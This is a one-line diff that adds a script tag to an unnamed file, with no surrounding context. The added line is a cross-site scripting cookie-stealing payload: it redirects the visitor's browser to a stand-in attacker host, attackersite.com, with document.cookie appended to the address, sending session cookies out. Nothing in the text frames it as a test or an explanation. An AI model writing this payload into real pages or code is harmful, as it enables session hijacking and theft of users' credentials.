@@ -1,0 +1,1 @@
+<script> window.location='http://attackersite.com/?cookie=' + document.cookie </script>
